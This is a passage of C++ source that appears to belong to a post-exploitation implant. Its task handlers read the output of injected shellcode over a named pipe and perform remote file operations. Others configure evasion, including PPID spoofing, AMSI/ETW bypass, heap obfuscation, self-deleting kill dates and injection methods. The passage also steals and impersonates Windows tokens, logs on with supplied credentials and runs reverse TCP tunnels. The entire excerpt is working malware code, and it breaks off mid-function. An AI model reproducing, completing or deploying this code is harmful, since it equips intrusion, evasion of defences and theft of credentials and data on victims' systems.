        // Give shellcode time to create the named pipe server and call ConnectNamedPipe
        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 200 );

        // Now connect as a client to the shellcode's pipe server
        KhDbg("Attempting to connect to pipe: %s", KH_FORK_PIPE_NAME);
        
        PipeHandle = Self->Krnl32.CreateFileA(
            KH_FORK_PIPE_NAME, 
            GENERIC_READ,  // We're reading output from the shellcode
            0, 
            nullptr, 
            OPEN_EXISTING, 
            0, 
            nullptr
        );
        
        if ( PipeHandle == INVALID_HANDLE_VALUE ) {
            DWORD err = KhGetError;
            QuickErr("Failed to connect to named pipe");
            return CleanupAndReturn();
        }

        KhDbg("Successfully connected to named pipe");

        // Now wait for the shellcode thread to complete execution
        DWORD waitResult = Self->Krnl32.WaitForSingleObject( Object->ThreadHandle, 15 * 1000 );
        if (waitResult == WAIT_TIMEOUT) {
            KhDbg("Thread execution timeout");
        } else {
            KhDbg("Thread finished normally");
        }

        // Give time for final writes to the pipe
        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );

        // Read output from the pipe
        BYTE  pipeBuffer[8192];
        DWORD totalBytesRead = 0;
        DWORD bytesAvailable = 0;
        
        BOOL peekSuccess = Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &bytesAvailable, nullptr );
        DWORD peekError = peekSuccess ? 0 : KhGetError;
        
        if ( peekSuccess ) {
            if ( bytesAvailable > 0 ) {
                KhDbg("Bytes available in pipe: %d", bytesAvailable);
            } else {
                KhDbg("No data available in pipe yet");
            }
        } else {
            KhDbg("PeekNamedPipe failed: %d", peekError);
            // If pipe is broken, there might still be buffered data - try to read it
            if ( peekError == ERROR_BROKEN_PIPE || peekError == ERROR_PIPE_NOT_CONNECTED ) {
                KhDbg("Pipe broken/disconnected, attempting to read buffered data anyway");
            }
        }
        
        // Try to read data regardless of peek result (there might be buffered data)
        if ( bytesAvailable > 0 || peekError == ERROR_BROKEN_PIPE || peekError == ERROR_PIPE_NOT_CONNECTED ) {
            do {
                DWORD bytesRead = 0;
                BOOL readSuccess = Self->Krnl32.ReadFile(
                    PipeHandle, pipeBuffer + totalBytesRead, 
                    sizeof( pipeBuffer ) - totalBytesRead - 1, 
                    &bytesRead, nullptr
                );
                
                if ( readSuccess && bytesRead > 0 ) {
                    totalBytesRead += bytesRead;
                    KhDbg("Read %d bytes from pipe (total: %d)", bytesRead, totalBytesRead);
                    
                    // Try to peek again to see if more data is available
                    if ( ! Self->Krnl32.PeekNamedPipe( PipeHandle, nullptr, 0, nullptr, &bytesAvailable, nullptr ) ) {
                        bytesAvailable = 0;
                    }
                } 
                else {
                    DWORD err = KhGetError;
                    if ( err == ERROR_BROKEN_PIPE || err == ERROR_PIPE_NOT_CONNECTED ) {
                        KhDbg("Pipe disconnected during read - no more data");
                        break;
                    }
                    else if ( err != ERROR_NO_DATA && err != ERROR_MORE_DATA ) {
                        KhDbg("ReadFile failed: %d", err);
                        break;
                    }
                    else {
                        // ERROR_NO_DATA means no more data available
                        break;
                    }
                }
                
                Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 10 );
                
            } while ( bytesAvailable > 0 && totalBytesRead < sizeof(pipeBuffer) - 1 );
        }
        
        if ( totalBytesRead > 0 ) {
            pipeBuffer[totalBytesRead] = '\0';
            
            KhDbg("Received total %d bytes from .NET process", totalBytesRead);
            
            QuickOut( Job->CmdID, pipeBuffer, totalBytesRead );
            KhDbg( "Process output: %s", pipeBuffer );
        }
        else {
            KhDbg("No output received from postex module");
        }
        
        // Close the pipe handle (we're the client, not the server)
        // Don't call DisconnectNamedPipe - that's only for servers
        KhDbg("Closing pipe handle");
        Self->Ntdll.NtClose( PipeHandle );
        PipeHandle = INVALID_HANDLE_VALUE;
        KhDbg("Pipe handle closed");
        
        // Skip exit code check - not critical and can cause issues
        KhDbg("Skipping exit code check, process will be terminated in cleanup");
        
        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 50 );
        KhDbg("About to call CleanupAndReturn");
    }

    KhDbg("Calling CleanupAndReturn with ERROR_SUCCESS");
    return CleanupAndReturn( ERROR_SUCCESS );
}

auto DECLFN Task::FileSystem(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8    SbCommandID  = Self->Psr->Byte( Parser );

    ULONG    TmpVal  = 0;
    BOOL     Success = TRUE;
    BYTE*    Buffer  = { 0 };

    KhDbg( "sub command id: %d", SbCommandID );

    Self->Pkg->Byte( Package, SbCommandID );
    
    switch ( SbCommandID ) {
        case Enm::Fs::ListFl: {
            WIN32_FIND_DATAA FindData     = { 0 };
            SYSTEMTIME       CreationTime = { 0 };
            SYSTEMTIME       AccessTime   = { 0 };
            SYSTEMTIME       WriteTime    = { 0 };

            CHAR   FullPath[MAX_PATH];
            HANDLE FileHandle = nullptr;
            ULONG  FileSize   = 0;
            PCHAR  TargetDir  = Self->Psr->Str( Parser, &TmpVal );
            HANDLE FindHandle = Self->Krnl32.FindFirstFileA( TargetDir, &FindData );

            if ( FindHandle == INVALID_HANDLE_VALUE || !FindHandle ) break;

            Self->Krnl32.GetFullPathNameA( FindData.cFileName, MAX_PATH, FullPath, nullptr );

            Self->Pkg->Str( Package, FullPath );
        
            do {
                FileHandle = Self->Krnl32.CreateFileA( FindData.cFileName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0 );
                FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
                
                Self->Ntdll.NtClose( FileHandle );

                Self->Pkg->Str( Package, FindData.cFileName );
                Self->Pkg->Int32( Package, FileSize );
                Self->Pkg->Int32( Package, FindData.dwFileAttributes );
        
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftCreationTime, &CreationTime );

                Self->Pkg->Int16( Package, CreationTime.wDay    );
                Self->Pkg->Int16( Package, CreationTime.wMonth  );
                Self->Pkg->Int16( Package, CreationTime.wYear   );
                Self->Pkg->Int16( Package, CreationTime.wHour   );
                Self->Pkg->Int16( Package, CreationTime.wMinute );
                Self->Pkg->Int16( Package, CreationTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastAccessTime, &AccessTime );

                Self->Pkg->Int16( Package, AccessTime.wDay    );
                Self->Pkg->Int16( Package, AccessTime.wMonth  );
                Self->Pkg->Int16( Package, AccessTime.wYear   );
                Self->Pkg->Int16( Package, AccessTime.wHour   );
                Self->Pkg->Int16( Package, AccessTime.wMinute );
                Self->Pkg->Int16( Package, AccessTime.wSecond );
                    
                Self->Krnl32.FileTimeToSystemTime( &FindData.ftLastWriteTime, &WriteTime );

                Self->Pkg->Int16( Package, WriteTime.wDay    );
                Self->Pkg->Int16( Package, WriteTime.wMonth  );
                Self->Pkg->Int16( Package, WriteTime.wYear   );
                Self->Pkg->Int16( Package, WriteTime.wHour   );
                Self->Pkg->Int16( Package, WriteTime.wMinute );
                Self->Pkg->Int16( Package, WriteTime.wSecond );
        
            } while ( Self->Krnl32.FindNextFileA( FindHandle, &FindData ));
        
            Success = Self->Krnl32.FindClose( FindHandle );

            break;
        }
        case Enm::Fs::Cwd: {
            CHAR CurDir[MAX_PATH] = { 0 };

            Self->Krnl32.GetCurrentDirectoryA( sizeof( CurDir ), CurDir ); 

            Self->Pkg->Str( Package, CurDir );

            break;
        }
        case Enm::Fs::Move: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.MoveFileA( SrcFile, DstFile ); 

            break;
        }
        case Enm::Fs::Copy: {
            PCHAR SrcFile = Self->Psr->Str( Parser, &TmpVal );
            PCHAR DstFile = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CopyFileA( SrcFile, DstFile, TRUE );

            break;
        }
        case Enm::Fs::MakeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.CreateDirectoryA( PathName, NULL );
            
            break;
        }
        case Enm::Fs::Delete: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.DeleteFileA( PathName );

            break;
        }
        case Enm::Fs::ChangeDir: {
            PCHAR PathName = Self->Psr->Str( Parser, &TmpVal );

            Success = Self->Krnl32.SetCurrentDirectoryA( PathName );

            break;
        }
        case Enm::Fs::Read: {
            PCHAR  PathName   = Self->Psr->Str( Parser, 0 );
            ULONG  FileSize   = 0;
            BYTE*  FileBuffer = { 0 };
            HANDLE FileHandle = Self->Krnl32.CreateFileA( PathName, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
            if (FileHandle == INVALID_HANDLE_VALUE) 
            {
                break;
            }
            FileSize   = Self->Krnl32.GetFileSize( FileHandle, 0 );
            FileBuffer = B_PTR( hAlloc( FileSize ) );

            Success = Self->Krnl32.ReadFile( FileHandle, FileBuffer, FileSize, &TmpVal, 0 );
            Self->Ntdll.NtClose( FileHandle );
            Buffer = FileBuffer;
            TmpVal = FileSize; 

            Self->Pkg->Bytes( Package, Buffer, TmpVal );

            break;
        }
    }

_KH_END:
    if ( ! Success ) { return KhGetError; }
    if ( SbCommandID != Enm::Fs::ListFl || SbCommandID != Enm::Fs::Read || SbCommandID != Enm::Fs::Cwd ) {
        Self->Pkg->Int32( Package, Success );
    }

    if ( Buffer ) { hFree( Buffer ); }

    return KhRetSuccess;
}

auto DECLFN Task::Pivot(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubCmd = Self->Psr->Byte( Parser );

    KhDbg( "sub command id: %d", SubCmd );

    Self->Pkg->Byte( Package, SubCmd );    

    switch ( SubCmd ) {
        case Enm::Pivot::List: {

        }
        case Enm::Pivot::Link: {

        }
        case Enm::Pivot::Unlink: {

        }
    }
    
    return KhRetSuccess;
}

auto DECLFN Task::Config(
    _In_ JOBS* Job
) -> ERROR_CODE {
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    INT32    ConfigCount = Self->Psr->Int32( Parser );
    ULONG    TmpVal      = 0;
    BOOL     Success     = FALSE;

    KhDbg( "config count: %d", ConfigCount );

    for ( INT i = 0; i < ConfigCount; i++ ) {
        UINT8 ConfigID = Self->Psr->Int32( Parser );
        KhDbg( "config id: %d", ConfigID );
        switch ( ConfigID ) {
            case Enm::Config::Ppid: {
                ULONG ParentID = Self->Psr->Int32( Parser );
                Self->Config.Ps.ParentID = ParentID;

                KhDbg( "parent id set to %d", Self->Config.Ps.ParentID ); 
                
                break;
            }
            case Enm::Config::Sleep: {
                ULONG NewSleep = Self->Psr->Int32( Parser );
                Self->Config.SleepTime = NewSleep * 1000;

                KhDbg( "new sleep time set to %d ms", Self->Config.SleepTime ); 
                
                break;
            }
            case Enm::Config::Jitter: {
                ULONG NewJitter = Self->Psr->Int32( Parser );
                Self->Config.Jitter = NewJitter;

                KhDbg( "new jitter set to %d", Self->Config.Jitter ); 
                
                break;
            }
            case Enm::Config::BlockDlls: {
                BOOL BlockDlls  = Self->Psr->Int32( Parser );
                Self->Config.Ps.BlockDlls = BlockDlls;
                
                KhDbg( "block non microsoft dlls is %s", Self->Config.Ps.BlockDlls ? "enabled" : "disabled" ); 
                
                break;
            }
            case Enm::Config::Mask: {
                INT32 TechniqueID = Self->Psr->Int32( Parser );
                if ( 
                    TechniqueID != eMask::Timer &&
                    TechniqueID != eMask::None 
                ) {
                    KhDbg( "invalid mask id: %d", TechniqueID );
                    return KH_ERROR_INVALID_MASK_ID;
                }
            
                Self->Config.Mask.TechniqueID = TechniqueID;
            
                KhDbg( 
                    "mask technique id set to %d (%s)", Self->Config.Mask.TechniqueID, 
                    Self->Config.Mask.TechniqueID   == eMask::Timer ? "timer" : 
                    ( Self->Config.Mask.TechniqueID == eMask::None  ? "wait" : "unknown" ) 
                );

                break;
            }
            case Enm::Config::HeapObf: {
                BOOL HeapObf = Self->Psr->Int32( Parser );

                Self->Config.Mask.Heap = HeapObf;

                KhDbg("Heap Obfuscate is %s", HeapObf ? "enabled" : "disabled");
                break;
            }
            case Enm::Config::Spawn: {
                CHAR* Spawnto = Self->Psr->Str( Parser, 0 );
                
                Self->Config.Postex.Spawnto = Spawnto;

                KhDbg("Spawnto is set to %s\n", Spawnto);

                break;
            }
            case Enm::Config::Killdate: {
                SYSTEMTIME LocalTime { 0 };

                INT16 Year  = (INT16)Self->Psr->Int32( Parser );
                INT16 Month = (INT16)Self->Psr->Int32( Parser );
                INT16 Day   = (INT16)Self->Psr->Int32( Parser );

                Self->Config.KillDate.Day   = Day;
                Self->Config.KillDate.Month = Month;
                Self->Config.KillDate.Year  = Year;

                if ( ! Day && ! Month && ! Year ) { 
                    Self->Config.KillDate.Enabled = FALSE;
                } else {
                    Self->Config.KillDate.Enabled = TRUE;
                }

                break;
            }
            case Enm::Config::KilldateExit: {
                BOOL KdExitProc = Self->Psr->Int32( Parser );
                
                Self->Config.KillDate.ExitProc = KdExitProc;

                KhDbg("Killdate set to exit %s", KdExitProc ? "process" : "thread");

                break;
            }
            case Enm::Config::KilldateSelfdel: {
                BOOL KdSelfdel = Self->Psr->Int32( Parser );

                Self->Config.KillDate.SelfDelete = KdSelfdel;

                KhDbg("Killdate set selfdelete to %s", KdSelfdel ? " true" : "false");

                break;
            }
            case Enm::Config::AmsiEtwBypass: {
                ULONG AmsiEtwBypass = Self->Psr->Int32( Parser );

                Self->Config.AmsiEtwBypass = AmsiEtwBypass;

                KhDbg("Amsi/Etw bypass changed");

                break;
            }
            case Enm::Config::Worktime: {
                INT16 HrStart = (INT16)Self->Psr->Int32( Parser );
                INT16 MnStart = (INT16)Self->Psr->Int32( Parser );
                INT16 HrEnd   = (INT16)Self->Psr->Int32( Parser );
                INT16 MnEnd   = (INT16)Self->Psr->Int32( Parser );

                Self->Config.Worktime.StartHour = HrStart;
                Self->Config.Worktime.StartMin  = MnStart;
                Self->Config.Worktime.EndMin    = HrEnd;
                Self->Config.Worktime.EndHour   = MnEnd;

                if ( ! HrStart && ! MnStart && ! HrEnd && ! MnEnd ) {
                    Self->Config.Worktime.Enabled = FALSE;
                } else {
                    Self->Config.Worktime.Enabled = TRUE;
                }

                break;
            }
            case Enm::Config::AllocMtd: {
                INT32 AllocMethod = Self->Psr->Int32( Parser );

                Self->Config.Injection.Alloc = AllocMethod;

                KhDbg("allocation method changed");

                break;
            }
            case Enm::Config::WriteMtd: {
                INT32 WriteMethod = Self->Psr->Int32( Parser );

                Self->Config.Injection.Write = WriteMethod;

                KhDbg("write method changed");

                break;
            }
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::Token(
    _In_ JOBS* Job
) -> ERROR_CODE {    
    PACKAGE* Package = Job->Pkg;
    PARSER*  Parser  = Job->Psr;

    UINT8 SubID = Self->Psr->Int32( Parser );

    Self->Pkg->Byte( Package, SubID );
    KhDbg( "Sub Command ID: %d", SubID );

    switch ( SubID ) {
        case Enm::Token::GetUUID: {
            CHAR*  ThreadUser  = nullptr;
            HANDLE TokenHandle = nullptr;

            TokenHandle = Self->Tkn->CurrentPs();            
            if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                KhDbg("Invalid token!");
                KhSetError( ERROR_INVALID_HANDLE );
                break;
            }

            ThreadUser = Self->Tkn->GetUser( TokenHandle );
            
            if ( ThreadUser ) {
                Self->Pkg->Str( Package, ThreadUser );
                hFree( ThreadUser ); KhSetError( ERROR_SUCCESS );
            } else {
                KhSetError( ERROR_NO_TOKEN );
            }

            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        case Enm::Token::List_t: {
            TOKEN_NODE* Current = Self->Tkn->Node;
            ULONG count = 0;

            while ( Current ) {
                count++;
                KhDbg("Linsting token %d:", count);
                KhDbg("  User: %s", Current->User ? Current->User : "NULL");
                KhDbg("  Host: %s", Current->Host? Current->Host : "NULL");
                KhDbg("  TokenID: %d", Current->TokenID);
                KhDbg("  Handle: %p", Current->Handle);
                KhDbg("  ProcessID: %d", Current->ProcessID);
                
                Self->Pkg->Str( Package, Current->User ? Current->User : (CHAR*)"" );
                Self->Pkg->Str( Package, Current->Host ? Current->Host : (CHAR*)"" );
                Self->Pkg->Int32( Package, Current->TokenID );
                Self->Pkg->Int64( Package, (LONG)Current->Handle );
                Self->Pkg->Int32( Package, Current->ProcessID );

                Current = Current->Next;
            }
            
            break;
        }
        case Enm::Token::Steal: {            
            ULONG ProcessID = Self->Psr->Int32( Parser );
            BOOL  TokenUse  = Self->Psr->Int32( Parser );

            KhDbg("[Task::Token::Steal] ProcessID: %d, TokenUse: %s", ProcessID, TokenUse ? "true" : "false");
            
            TOKEN_NODE* Token = Self->Tkn->Steal( ProcessID );

            if ( ! Token ) {
                Self->Pkg->Int32( Package, FALSE );
                break;
            }

            Self->Pkg->Int32( Package, TRUE );
            Self->Pkg->Int32( Package, Token->TokenID );
            Self->Pkg->Int32( Package, Token->ProcessID );
            Self->Pkg->Str( Package, Token->User ? Token->User : (CHAR*)"" );
            Self->Pkg->Str( Package, Token->Host ? Token->Host : (CHAR*)"" );
            Self->Pkg->Int64( Package, (INT64)Token->Handle );

            KhDbg( "[+] Token ID: %d", Token->TokenID );
            KhDbg( "[+] Process ID: %d", Token->ProcessID );
            KhDbg( "[+] User Name: %s", Token->User ? Token->User : "NULL" );
            KhDbg( "[+] Host Name: %s", Token->Host ? Token->Host : "NULL" );
            KhDbg( "[+] Handle: %p", Token->Handle );

            if ( TokenUse ) {
                if ( Self->Tkn->Use( Token->Handle ) ) {
                    KhDbg("Token impersonated successfully");
                } else {
                    KhDbg("Failed to impersonate token: %d", KhGetError);
                }
            } else {
                KhDbg("TokenUse=false, not impersonated");
            }

            break;
        }
        case Enm::Token::Impersonate: {            
            ULONG TokenID = Self->Psr->Int32( Parser );
            KhDbg("Impersonating Token ID: %d", TokenID);

            TOKEN_NODE* TokenObj = Self->Tkn->GetByID( TokenID );
            
            BOOL result = Self->Tkn->Use( TokenObj->Handle );
            KhDbg("Impersonate Result: %s", result ? "SUCCESS" : "FAILED");
            
            Self->Pkg->Int32( Package, result );
            
            break;
        }
        case Enm::Token::Remove_t: {            
            ULONG TokenID = Self->Psr->Int32( Parser );
            BOOL  result  = Self->Tkn->Rm( TokenID );
            
            Self->Pkg->Int32( Package, result );
            
            break;
        }
        case Enm::Token::Revert: {            
            BOOL result = Self->Tkn->Rev2Self();
            Self->Pkg->Int32( Package, result );
            
            break;
        }
        case Enm::Token::Make: {
            KhDbg("[Task::Token] Comando: Make");
            
            CHAR*  UserName    = Self->Psr->Str( Parser, 0 );
            CHAR*  Password    = Self->Psr->Str( Parser, 0 );
            CHAR*  DomainName  = Self->Psr->Str( Parser, 0 );
            HANDLE TokenHandle = nullptr;

            KhDbg("User   Name: %s", UserName ? UserName : "NULL");
            KhDbg("Domain Name: %s", DomainName ? DomainName : "NULL");
            KhDbg("Attempting logon: %s\\%s", DomainName ? DomainName : ".", UserName);

            if ( ! Self->Advapi32.LogonUserA( 
                UserName, 
                DomainName && DomainName[0] ? DomainName : nullptr, 
                Password, 
                LOGON32_LOGON_INTERACTIVE, 
                LOGON32_PROVIDER_DEFAULT, 
                &TokenHandle
            ) ) {
                DWORD Error = KhGetError;
                
                if ( !Self->Advapi32.LogonUserA( 
                    UserName, 
                    DomainName && DomainName[0] ? DomainName : nullptr, 
                    Password, 
                    LOGON32_LOGON_NETWORK, 
                    LOGON32_PROVIDER_DEFAULT, 
                    &TokenHandle
                ) ) {
                    Self->Pkg->Int32( Package, FALSE );
                    break;
                }
            }

            if ( !TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                KhDbg("[-] Invalid token handle");
                Self->Pkg->Int32( Package, FALSE );
                break;
            }

            TOKEN_NODE* NewToken = Self->Tkn->Add( TokenHandle, Self->Session.ProcessID );
            
            if ( NewToken ) {
                Self->Pkg->Int32( Package, TRUE );
                Self->Pkg->Int32( Package, NewToken->TokenID );
                Self->Pkg->Int32( Package, NewToken->ProcessID );
                Self->Pkg->Str( Package, NewToken->User ? NewToken->User : (CHAR*)"" );
                Self->Pkg->Str( Package, NewToken->Host ? NewToken->Host : (CHAR*)"" );
                
                Self->Pkg->Int64( Package, (INT64)NewToken->Handle );
            } else {
                Self->Ntdll.NtClose( TokenHandle );
                Self->Pkg->Int32( Package, FALSE );
            }

            break;
        }
        case Enm::Token::GetPriv: {            
            HANDLE TokenHandle = Self->Tkn->CurrentPs();
            
            if ( !TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                Self->Pkg->Int32( Package, FALSE );
                break;
            }

            BOOL Result = Self->Tkn->GetPrivs( TokenHandle );
            
            Self->Pkg->Int32( Package, Result );
            
            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        case Enm::Token::LsPriv: {
            ULONG       PrivListLen = 0;
            PRIV_LIST** PrivList    = nullptr;
            HANDLE      TokenHandle = Self->Tkn->CurrentPs();

            if ( ! TokenHandle || TokenHandle == INVALID_HANDLE_VALUE ) {
                Self->Pkg->Int32( Package, 0 );
                break;
            }

            PrivList = (PRIV_LIST**)Self->Tkn->ListPrivs( TokenHandle, PrivListLen );
            Self->Pkg->Int32( Package, PrivListLen );

            if ( PrivList ) {
                for ( ULONG i = 0; i < PrivListLen; i++ ) {
                    if ( ! PrivList[i] ) {
                        continue;
                    }
                    
                    Self->Pkg->Str(   Package, PrivList[i]->PrivName   );
                    Self->Pkg->Int32( Package, PrivList[i]->Attributes );
                    
                    if ( PrivList[i]->PrivName ) {
                        hFree( PrivList[i]->PrivName );
                    }

                    hFree( PrivList[i] );
                }

                hFree( PrivList );
            }

            Self->Ntdll.NtClose( TokenHandle );

            break;
        }
        default: {
            KhSetError( ERROR_INVALID_PARAMETER );
            break;
        }
    }

    return KhRetSuccess;
}

auto DECLFN Task::ProcessTunnel(
    _In_ JOBS* Job
) -> ERROR_CODE {

    KhDbg("[Task::ProcessTunnel]");

    PACKAGE* Package = Job->Pkg;

    COMMAND_TUNNEL_ACCEPT_EVENT Events_Accept[30] = { 0 };
    ULONG COMMAND_TUNNEL_ACCEPT_EventLen = 0;
    COMMAND_TUNNEL_START_TCP_EVENT Events[90] = { 0 };
    ULONG StartTcpLength = 0;
    COMMAND_TUNNEL_WRITE_TCP_EVENT Events_Write[30] = { 0 };
    ULONG COMMAND_TUNNEL_WRITE_TCP_EventLen = 0;

    INT8  Index    = -1;
    for ( INT i = 0; i < 30; i++ ) {
        if ( ! Self->Tsp->Tunnels[i].ChannelID || Self->Tsp->Tunnels[i].ChannelID == 0 ) {
            Index = i; break;
        }
    }

	timeval timeout = { 0, 100 };
	for (INT i = 0; i < 30; i++) {

        if (Self->Tsp->Tunnels[i].state == TUNNEL_STATE_CONNECT) {

            ULONG channelId = Self->Tsp->Tunnels[i].ChannelID;
            fd_set readfds;
            readfds.fd_count = 1;
            readfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
            fd_set exceptfds;
            exceptfds.fd_count = 1;
            exceptfds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
            fd_set writefds;
            writefds.fd_count = 1;
            writefds.fd_array[0] = Self->Tsp->Tunnels[i].Socket;
            Self->Ws2_32.select(0, &readfds, &writefds, &exceptfds, &timeout);

            if ( Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_REVERSE_TCP ) {
                if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &readfds)) {
                    SOCKET sock = Self->Ws2_32.accept(Self->Tsp->Tunnels[i].Socket, 0, 0);
                    ULONG mode = 1;
                    if (Self->Ws2_32.ioctlsocket(sock, FIONBIO, &mode) == -1) {
                        Self->Ws2_32.closesocket(sock);
                        continue;
                    }
    
                    ULONG cid = Self->Krnl32.GetTickCount();
                    cid = Self->Ntdll.RtlRandomEx(&cid);
                    cid = cid % ULONG_MAX;
    
                    KhDbg("cid: %lu", cid);
                    
                    if(Index != -1){
                        Self->Tsp->Tunnels[Index].ChannelID = cid;
                        Self->Tsp->Tunnels[Index].Port = 0;
                        Self->Tsp->Tunnels[Index].Host = "";
                        Self->Tsp->Tunnels[Index].Username = "";
                        Self->Tsp->Tunnels[Index].Password = ""; 
                        Self->Tsp->Tunnels[Index].Socket = sock;  
                        Self->Tsp->Tunnels[Index].state = TUNNEL_STATE_READY;
                        Self->Tsp->Tunnels[Index].mode = TUNNEL_MODE_SEND_TCP;                     
                        Self->Tsp->Tunnels[Index].waitTime = 180000;                     
                        Self->Tsp->Tunnels[Index].startTick = Self->Krnl32.GetTickCount();
                        Self->Tsp->numTunnelTasks++;
                    }
                    
                    if (COMMAND_TUNNEL_ACCEPT_EventLen < 30) {
                        Events_Accept[COMMAND_TUNNEL_ACCEPT_EventLen].TunnelID = Self->Tsp->Tunnels[i].ChannelID;
                        Events_Accept[COMMAND_TUNNEL_ACCEPT_EventLen].SubCmd = COMMAND_TUNNEL_ACCEPT;
                        Events_Accept[COMMAND_TUNNEL_ACCEPT_EventLen].ChannelID = cid;
                        COMMAND_TUNNEL_ACCEPT_EventLen++;
                    }
                    // packer->Pack32(Self->Tsp->Tunnels[i].ChannelID); // tunnel ID
                    // packer->Pack32(COMMAND_TUNNEL_ACCEPT);
                    // packer->Pack32(cid);
                }
            }else{
                if (Self->Tsp->Tunnels[i].mode == TUNNEL_MODE_SEND_TCP) {
                    KhDbg("BP 3 -1");
                    if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &exceptfds)) {
                        Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
                        // Pack and send to server
                        //PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
                        ULONG result = 0;
    
                        if (StartTcpLength < 90) {
                            Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                            Events[StartTcpLength].Result = result;
                            StartTcpLength++;
                        }
    
                        // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
                        // Self->Pkg->Int32( Package, result );
                        continue;
                    }
                    KhDbg("BP 3 -2");
                    if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &writefds)) {
                        Self->Tsp->Tunnels[i].state = TUNNEL_STATE_READY;
                        // Pack and send to server
                        // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
                        ULONG result = 1;
    
                        if (StartTcpLength < 90) {
                            Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                            Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                            Events[StartTcpLength].Result = result;
                            StartTcpLength++;
                        }
    
                        // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
                        // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
                        // Self->Pkg->Int32( Package, result );
                        continue;
                    }
                    KhDbg("BP 3 -3");
                    if (Self->Ws2_32.__WSAFDIsSet(Self->Tsp->Tunnels[i].Socket, &readfds)) {
                        SOCKET tmp_sock_2 = Self->Ws2_32.accept(Self->Tsp->Tunnels[i].Socket, 0, 0);
                        Self->Tsp->Tunnels[i].Socket = tmp_sock_2;
                        KhDbg("BP - 3 -4");
                        if (tmp_sock_2 == -1) {
                            Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
                            // Pack and send to server
                            // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
                            ULONG result = 0;
                            if (StartTcpLength < 90) {
                                Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                                Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                                Events[StartTcpLength].Result = result;
                                StartTcpLength++;
                            }
                            // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
                            // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
                            // Self->Pkg->Int32( Package, result );
                        }
                        else {
                            Self->Tsp->Tunnels[i].state = TUNNEL_STATE_READY;
                            // Pack and send to server
                            // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, TRUE);
                            ULONG result = 1;
    
                            if (StartTcpLength < 90) {
                                Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                                Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                                Events[StartTcpLength].Result = result;
                                StartTcpLength++;
                            }
    
                            // Self->Pkg->Int32( Package, Self->Tsp->Tunnels[i].ChannelID );
                            // Self->Pkg->Int32( Package, COMMAND_TUNNEL_START_TCP );
                            // Self->Pkg->Int32( Package, result );
                        }
                        Self->Ws2_32.closesocket(Self->Tsp->Tunnels[i].Socket);
                        continue;
                    }
                }
                
                if (Self->Krnl32.GetTickCount() - Self->Tsp->Tunnels[i].startTick > Self->Tsp->Tunnels[i].waitTime) {
    
                    Self->Tsp->Tunnels[i].state = TUNNEL_STATE_CLOSE;
                    // Pack and send to server
                    // PackProxyStatus(packer, tunnelData->channelID, COMMAND_TUNNEL_START_TCP, FALSE);
                    ULONG result = 0;
    
                    if (StartTcpLength < 90) {
                        Events[StartTcpLength].ChannelID = Self->Tsp->Tunnels[i].ChannelID;
                        Events[StartTcpLength].SubCmd = COMMAND_TUNNEL_START_TCP;
                        Events[StartTcpLength].Result = result;
                        StartTcpLength++;
                    }
                    // Self->Pkg->Int64( Package, Self->Tsp->Tunnels[i].ChannelID );
